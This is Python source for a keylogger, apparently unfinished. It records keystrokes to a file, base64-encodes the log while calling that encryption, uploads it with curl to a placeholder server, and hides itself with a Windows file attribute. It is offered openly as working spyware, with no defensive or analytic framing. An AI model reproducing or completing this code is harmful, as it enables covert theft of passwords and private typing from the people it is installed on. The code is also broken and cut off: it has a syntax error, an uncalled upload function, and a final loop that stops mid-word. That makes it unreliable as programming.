# Import the necessary libraries
import pynput
import base64
import os
import getpass
import threading

# Set the server address and password
SERVER_ADDRESS = "yourserver.com"
SERVER_PASSWORD = "yourpassword"

# Define a function to be called every time a key is pressed
def on_press(key):
  # Filter the keys to include only letters, numbers, and punctuation
  if key.char in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.,!?;:'\"/\\|-_=+()[]{}<>"
    # Open the log file in append mode
    with open("key_log.txt", "a") as log_file:
      # Write the pressed key to the log file
      log_file.write(key.char)

# Define a function to encrypt the log file
def encrypt_log_file():
  # Open the log file in read mode
  with open("key_log.txt", "r") as log_file:
    # Read the log file
    log_data = log_file.read()

  # Encrypt the log data
  encrypted_log_data = base64.b64encode(log_data.encode())

  # Open the log file in write mode
  with open("key_log.txt", "w") as log_file:
    # Write the encrypted log data to the log file
    log_file.write(encrypted_log_data)

# Define a function to send the log file to the server
def send_log_file_to_server():
  # Encrypt the log file
  encrypt_log_file()

  # Open the log file in read mode
  with open("key_log.txt", "r") as log_file:
    # Read the log file
    log_data = log_file.read()

  # Send the log file to the server
  os.system(f"curl -X POST -u {SERVER_PASSWORD} -T key_log.txt {SERVER_ADDRESS}")

# Define a function to hide the keylogger
def hide_keylogger():
  # Get the current user
  user = getpass.getuser()

  # Hide the keylogger file
  os.system(f"attrib +H C:\\Users\\{user}\\keylogger.py")

# Create a keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

# Start the keyboard listener in a separate thread
threading.Thread(target=keyboard_listener.start).start()

# Print instructions on how to stop the keylogger
print("The keylogger is running. Press 'q' followed by 'Enter' to stop it.")

# Wait for the user to input 'q' to stop the keylogger
while True:
  stop
